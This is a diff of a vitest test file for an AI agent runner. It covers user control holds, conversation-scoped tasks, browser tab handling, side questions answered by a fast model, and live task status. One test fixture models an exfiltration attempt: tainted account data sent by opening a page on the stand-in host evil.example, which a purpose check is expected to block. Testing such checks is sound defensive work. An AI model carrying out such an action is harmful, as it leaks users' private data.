@@ -2,11 +2,18 @@ import { randomUUID } from "node:crypto";
 import { mkdirSync, mkdtempSync, rmSync } from "node:fs";
 import { join } from "node:path";
 import { CodexLaunchError, prepareOwnedCodexRoots } from "@localdot/codex-harness";
-import { CAREFUL_AUTONOMY, type KeydRecord, PERSONAS, ulid } from "@localdot/protocol";
+import {
+  CAREFUL_AUTONOMY,
+  type ConversationLive,
+  type KeydRecord,
+  PERSONAS,
+  ulid,
+} from "@localdot/protocol";
 import { normalizeCatalog } from "@localdot/providers";
 import { MODELS_DEV_FIXTURE } from "@localdot/providers/testing";
 import { afterEach, describe, expect, it, vi } from "vitest";
 import { BrowserClient, BrowserClientError } from "../browser/client.ts";
+import { BrowserInUseError } from "../browser/screen-controller.ts";
 import { SessionScreens } from "../browser/session-screens.ts";
 import { BrowserStreams } from "../browser/streams.ts";
 import type { ReadyBrowser } from "../cells/browser-orchestrator.ts";
@@ -265,16 +272,27 @@ describe("the user's own hold on the computer", () => {
     expect(next.id).not.toBe(session.id);
     expect(await f.runner.stopRun(session.id)).toBe(true);
   });
-  it("starting a task hands back a user-only hold on the same computer", async () => {
+  it("a task in the hold's conversation hands it back; one in another starts beside it", async () => {
     const f = setup();
     const hold = await f.runner.hold(f.cellId);
     const held = f.runner.get(hold.sessionId)!;
     await until(() => held.manualControl === "ready");
-    const next = await f.runner.start(f.cellId, "Continue from this screen");
+    const elsewhere = await f.runner.start(f.cellId, "Something else", undefined, {
+      continues: null,
+    });
+    expect(held.controlHeld).toBe(true);
+    expect(f.live.sessionsOn(f.cellId)).toEqual([hold.sessionId, elsewhere.id]);
+    const next = await f.runner.start(f.cellId, "Continue from this screen", undefined, {
+      continues: hold.sessionId,
+    });
     expect(next.cellId).toBe(f.cellId);
     expect(next.id).not.toBe(hold.sessionId);
     expect(held.controlHeld).toBe(false);
     expect(f.containment).not.toHaveBeenCalled();
+    for (const task of [elsewhere, next]) {
+      task.stop();
+      await f.live.settled(task.id);
+    }
   });
   it.each(["working task", "user-only hold"] as const)(
     "Stop ends a %s while the user holds control, without handing back or resuming work",
@@ -286,10 +304,18 @@ describe("the user's own hold on the computer", () => {
           await abortable(new Promise<never>(() => {}), session.abort.signal);
           return 0;
         });
-        await f.runner.start(f.cellId, "Work until stopped");
+        const task = await f.runner.start(f.cellId, "Work until stopped");
         await until(() => f.run.mock.calls.length === 1);
+        task.takeControl();
       }
-      const { sessionId, requestId } = await f.runner.hold(f.cellId);
+      const { sessionId, requestId } =
+        kind === "working task"
+          ? (() => {
+              const [id] = f.live.sessionsOn(f.cellId);
+              const task = f.runner.get(id ?? "");
+              return { sessionId: id ?? "", requestId: task?.pendingTakeover };
+            })()
+          : await f.runner.hold(f.cellId);
       const session = f.runner.get(sessionId);
       if (!session) throw new Error("fixture missing held task");
       await until(() => session.manualControl === "ready");
@@ -436,15 +462,19 @@ describe("the user's own hold on the computer", () => {
     expect(f.installSkills).not.toHaveBeenCalled();
   });
 
-  it("gives the user the control of a task live on the computer instead", async () => {
+  it("holds the computer for the user beside a task live on it", async () => {
     const f = setup();
     const task = await f.runner.start(f.cellId, "Fixture task");
     await until(() => task.status === "idle");
     const reply = await f.runner.hold(f.cellId);
-    expect(reply).toEqual({ sessionId: task.id, requestId: task.pendingTakeover });
-    expect(f.runner.holds(task.id)).toBe(false);
-    task.stop();
-    await f.live.settled(task.id);
+    expect(reply.sessionId).not.toBe(task.id);
+    expect(f.runner.holds(reply.sessionId)).toBe(true);
+    expect(task.controlHeld).toBe(false);
+    expect(f.live.sessionsOn(f.cellId)).toEqual([task.id, reply.sessionId]);
+    for (const id of [task.id, reply.sessionId]) {
+      f.runner.get(id)?.stop();
+      await f.live.settled(id);
+    }
   });
 
   it("follows a hold the user handed back with a new one", async () => {
@@ -507,6 +537,7 @@ describe("signing in to a site from Settings", () => {
       armed: [] as string[],
       opened: [] as string[],
       typed: [] as string[],
+      blankTabs: 0,
     };
     const current = (permit: { revision: number }, holder: "user" | "agent") => {
       if (browserd.holder !== holder || permit.revision !== browserd.revision)
@@ -541,6 +572,12 @@ describe("signing in to a site from Settings", () => {
       scope.check();
       current(permit, "agent");
       return { mono: 50 } as never;
+    });
+    vi.spyOn(prototype, "openTab").mockImplementation(async (permit, scope) => {
+      scope.check();
+      current(permit, "agent");
+      browserd.blankTabs++;
+      return tabId;
     });
     vi.spyOn(prototype, "navigate").mockImplementation(async (permit, _tab, url, scope) => {
       scope.check();
@@ -587,10 +624,12 @@ describe("signing in to a site from Settings", () => {
       registry: { for: () => undefined },
       recordings: { attach: async () => {}, fence: async () => {} },
       downloads: { collect: async () => [] },
+      live: f.live,
+      makeWay: (sessionId, signal) => f.runner.makeWay(sessionId, signal),
       report,
       now: () => 0,
     });
-    f.deps.installSession = (session, cell) => screens.install(session, cell);
+    f.deps.installSession = (session, cell, freshTab) => screens.install(session, cell, freshTab);
     f.deps.startBrowser = (id) => screens.startBrowser(id);
     return { browserd, browser, screens, report, dispose: () => streams.dispose() };
   }
@@ -670,6 +709,98 @@ describe("signing in to a site from Settings", () => {
     }
   });
 
+  it("opens a blank tab for a new conversation's task, not for one that continues it or the user", async () => {
+    const f = setup();
+    f.deps.conversations = new Conversations(f.home, f.log);
+    const web = webBrowser(f);
+    f.run.mockImplementation(async (session) => {
+      const generation = session.beginBrain();
+      session.setStatus("running");
+      try {
+        await session.prepareScreens(generation);
+        const lease = session.admit(generation);
+        await session.switchScreen("browser", lease);
+        lease.finish();
+        return 0;
+      } finally {
+        session.retireBrain(generation);
+      }
+    });
+    try {
+      const first = await f.runner.start(f.cellId, "Find a flight");
+      await until(() => first.status === "idle");
+      expect(first.screens?.selection.screen).toBe("browser");
+      expect(web.browserd.blankTabs).toBe(1);
+      const next = await f.runner.start(f.cellId, "Now a hotel there");
+      await until(() => next.status === "idle");
+      expect(next.screens?.selection.screen).toBe("browser");
+      expect(web.browserd.blankTabs).toBe(1);
+      await signInByHand(f, web);
+      expect(web.browserd.blankTabs).toBe(1);
+      const other = await f.runner.start(f.cellId, "Something else", undefined, {
+        continues: null,
+      });
+      await until(() => other.status === "idle");
+      expect(web.browserd.blankTabs).toBe(2);
+    } finally {
+      web.dispose();
+      vi.restoreAllMocks();
+    }
+  });
+
+  it("ends a finished task holding the web browser when another conversation's task needs it, never one at work", async () => {
+    const f = setup();
+    f.deps.conversations = new Conversations(f.home, f.log);
+    const web = webBrowser(f);
+    const refused: unknown[] = [];
+    const browse = (hold?: Promise<void>) => async (session: AgentSession) => {
+      const generation = session.beginBrain();
+      session.setStatus("running");
+      try {
+        await session.prepareScreens(generation);
+        const lease = session.admit(generation);
+        await session.switchScreen("browser", lease).catch((error: unknown) => {
+          refused.push(error);
+        });
+        lease.finish();
+        await hold;
+        return 0;
+      } finally {
+        session.retireBrain(generation);
+      }
+    };
+    try {
+      f.run.mockImplementationOnce(browse());
+      const done = await f.runner.start(f.cellId, "Find a flight");
+      await until(() => done.status === "idle");
+      f.run.mockImplementationOnce(browse());
+      const next = await f.runner.start(f.cellId, "Book a table", undefined, { continues: null });
+      await until(() => next.status === "idle");
+      expect(done.stopped).toBe(true);
+      expect(next.screens?.selection.screen).toBe("browser");
+      expect(f.live.browserHolder(f.cellId)).toBe(next.id);
+      expect(web.browserd.blankTabs).toBe(2);
+      const working = deferred<void>();
+      f.run.mockImplementationOnce(browse(working.promise));
+      const busy = await f.runner.start(f.cellId, "Watch the price", undefined, {
+        continues: null,
+      });
+      await until(() => f.live.browserHolder(f.cellId) === busy.id);
+      f.run.mockImplementationOnce(browse());
+      const late = await f.runner.start(f.cellId, "Check the weather", undefined, {
+        continues: null,
+      });
+      await until(() => late.status === "idle");
+      expect(refused).toEqual([expect.any(BrowserInUseError)]);
+      expect(busy.stopped).toBe(false);
+      expect(f.live.browserHolder(f.cellId)).toBe(busy.id);
+      working.resolve();
+    } finally {
+      web.dispose();
+      vi.restoreAllMocks();
+    }
+  });
+
   it("opens the site's sign-in page in the web browser, then hands it to the user", async () => {
     const f = setup();
     const browser = screens(f);
@@ -708,11 +839,12 @@ describe("signing in to a site from Settings", () => {
     await f.live.settled(next.sessionId);
   });
 
-  it("ends a finished task waiting for a follow-up, and leaves a task at work alone", async () => {
+  it("ends a finished task still on the web browser, and leaves a task at work there alone", async () => {
     const f = setup();
     screens(f);
     const rest = await f.runner.start(f.cellId, "Fixture task");
     await until(() => rest.status === "idle");
+    f.live.claimBrowser(f.cellId, rest.id);
     const reply = await f.runner.signIn(f.cellId, "x.com", "https://x.com/i/flow/login");
     expect(rest.stopped).toBe(true);
     f.runner.get(reply.sessionId)?.stop();
@@ -721,25 +853,28 @@ describe("signing in to a site from Settings", () => {
     f.run.mockImplementationOnce(() => working.promise);
     const task = await f.runner.start(f.cellId, "Fixture task");
     await until(() => f.run.mock.calls.length === 2);
+    f.live.claimBrowser(f.cellId, task.id);
     await expect(f.runner.signIn(f.cellId, "x.com", "https://x.com/")).rejects.toThrow(AgentError);
     expect(task.stopped).toBe(false);
-    expect(f.live.get(f.cellId)).toBe(task.id);
+    expect(f.live.sessionsOn(f.cellId)).toEqual([task.id]);
     working.resolve(0);
     task.stop();
     await f.live.settled(task.id);
   });
 
   // Stop contains the computer; a task that only waits for a follow-up has nothing to contain.
-  it("ends a finished task without stopping the computer when the next one starts", async () => {
+  it("ends a finished task without stopping the computer when its conversation goes on", async () => {
     const f = setup();
     const { closed } = screens(f);
     const first = await f.runner.start(f.cellId, "Fixture task");
     await until(() => first.status === "idle");
-    const next = await f.runner.start(f.cellId, "Another task");
+    const next = await f.runner.start(f.cellId, "Another task", undefined, {
+      continues: first.id,
+    });
     expect(first.stopped).toBe(true);
     expect(closed).not.toHaveBeenCalled();
     expect(f.containment).not.toHaveBeenCalled();
-    expect(f.live.get(f.cellId)).toBe(next.id);
+    expect(f.live.sessionsOn(f.cellId)).toEqual([next.id]);
     next.stop();
     await f.live.settled(next.id);
   });
@@ -1132,7 +1267,8 @@ describe("Claude Code (your plan)", () => {
     session.taint.add("files", "~/notes.txt", "Account 4417-1234-5678");
     const leak = [{ kind: "open_page", destination: "evil.example", text: "/c?d=1" }] as const;
     expect((await session.purpose?.check(leak, new AbortController().signal))?.allow).toBe(false);
-    expect(answer).toHaveBeenCalledOnce();
+    // Once for the purpose check, once to name the new conversation.
+    expect(answer).toHaveBeenCalledTimes(2);
     expect(questions.length).toBeGreaterThan(0);
     expect(
       f.log
@@ -1158,9 +1294,80 @@ describe("Claude Code (your plan)", () => {
     const answer = vi.fn();
     if (f.deps.claudeCode) f.deps.claudeCode.answer = answer;
     const session = await f.runner.start(f.cellId, "Fixture task");
-    expect(answer).not.toHaveBeenCalled();
+    // Only the main model on the plan is asked, to name the new conversation.
+    expect(answer.mock.calls).toEqual([[{ model: "opus", options: { reasoningEffort: "low" } }]]);
     session.stop();
     await f.live.settled(session.id);
+  });
+  it("answers a side question on the plan's fast model from the task's record, which never hears of it", async () => {
+    const f = claudeSetup();
+    f.setSettings({
+      main: { provider: "claude-code", model: "opus" },
+      fast: { provider: "claude-code", model: "haiku" },
+    });
+    f.secrets.mockResolvedValue([]);
+    const asked: { system: string; prompt: string }[] = [];
+    const answer = vi.fn(() => async (system: string, prompt: string) => {
+      asked.push({ system, prompt });
+      return { text: " It is comparing two flights. ", inputTokens: 40, outputTokens: 9 };
+    });
+    if (f.deps.claudeCode) f.deps.claudeCode.answer = answer;
+    const session = await f.runner.start(f.cellId, "Find flights to Lisbon");
+    await until(() => session.status === "idle");
+    const transcript = f.deps.transcripts.read(session.id);
+    const delivered = session.delivered;
+    const reply = await f.runner.sideAnswer(
+      session.id,
+      "Which airline is cheaper?",
+      new AbortController().signal,
+    );
+    expect(reply).toEqual({
+      answer: "It is comparing two flights.",
+      provider: "claude-code",
+      model: "haiku",
+    });
+    // A new conversation's naming request goes to the same model first.
+    const side = asked.find((call) => call.prompt.includes("Side question:"));
+    expect(side?.prompt).toContain("The user: Find flights to Lisbon");
+    expect(side?.prompt).toContain("Side question: Which airline is cheaper?");
+    expect(side?.system).toContain("dot never sees this question or your answer");
+    expect(f.deps.transcripts.read(session.id)).toEqual(transcript);
+    expect(session.delivered).toBe(delivered);
+    const log = JSON.stringify(f.log.read(session.id));
+    expect(log).not.toContain("airline");
+    expect(log).not.toContain("comparing two flights");
+    session.stop();
+    await f.live.settled(session.id);
+    // An ended task is asked about on the saved fast model; there is no task left to count it in.
+    await expect(
+      f.runner.sideAnswer(session.id, "Did it finish?", new AbortController().signal),
+    ).resolves.toMatchObject({ answer: "It is comparing two flights.", model: "haiku" });
+    expect(asked.filter((call) => call.prompt.includes("Side question:"))).toHaveLength(2);
+  });
+  it("says when no fast model can answer a side question", async () => {
+    const f = claudeSetup();
+    f.secrets.mockResolvedValue([]);
+    const session = await f.runner.start(f.cellId, "Fixture task");
+    await until(() => session.status === "idle");
+    const signal = new AbortController().signal;
+    await expect(f.runner.sideAnswer(session.id, "Why?", signal)).rejects.toMatchObject({
+      status: 409,
+      problem: "no-fast-model",
+    });
+    session.stop();
+    await f.live.settled(session.id);
+    // A fast model on an API key answers only through a running task's key layer.
+    f.setSettings({
+      main: { provider: "anthropic", model: "claude-sonnet-4-5", key: "anthropic" },
+      fast: { provider: "anthropic", model: "claude-haiku-4-5", key: "anthropic" },
+    });
+    await expect(f.runner.sideAnswer(session.id, "Why?", signal)).rejects.toMatchObject({
+      status: 409,
+      problem: "fast-model-not-running",
+    });
+    await expect(f.runner.sideAnswer(ulid(), "Why?", signal)).rejects.toMatchObject({
+      status: 404,
+    });
   });
   it("checks where data goes as on the ChatGPT plan: with a Jev key, unsure without keys, off when off", async () => {
     const at = "2026-10-03T00:00:00Z";
@@ -2141,5 +2348,42 @@ describe("connected apps", () => {
     expect(seen).toBe(snapshot);
     task.stop();
     await f.live.settled(task.id);
+  });
+});
+
+describe("a live task's status for the conversation list", () => {
+  it("says whether it works, waits for the computer or the user, rests, and holds the screen", async () => {
+    const f = setup();
+    const told: [string, ConversationLive | undefined][] = [];
+    f.deps.liveChanged = (id, live) => told.push([id, live]);
+    const task = await f.runner.start(f.cellId, "Fixture task");
+    await until(() => task.status === "idle");
+    expect(f.runner.liveStatus(task.id)).toEqual({
+      state: "idle",
+      since: expect.any(String),
+      onScreen: false,
+    });
+    const lease = f.live.lease(f.cellId);
+    const turn = await lease.acquire(task.id);
+    expect(f.runner.liveStatus(task.id)).toMatchObject({ state: "idle", onScreen: true });
+    const other = await f.runner.hold(f.cellId);
+    turn.release();
+    const busy = await lease.acquire(other.sessionId);
+    const waiting = lease.acquire(task.id);
+    expect(f.runner.liveStatus(task.id)).toMatchObject({ state: "waiting-for-computer" });
+    busy.release();
+    (await waiting).release();
+    task.takeControl();
+    expect(f.runner.liveStatus(task.id)).toMatchObject({ state: "needs-you", onScreen: false });
+    expect(
+      told.some(([id, live]) => id === task.id && live?.state === "waiting-for-computer"),
+    ).toBe(true);
+    for (const id of [task.id, other.sessionId]) {
+      f.runner.get(id)?.stop();
+      await f.live.settled(id);
+    }
+    expect(f.runner.liveStatus(task.id)).toBeUndefined();
+    expect(told.at(-1)?.[1]).toBeUndefined();
+    expect(told.some(([id]) => id === other.sessionId)).toBe(false);
   });
 });
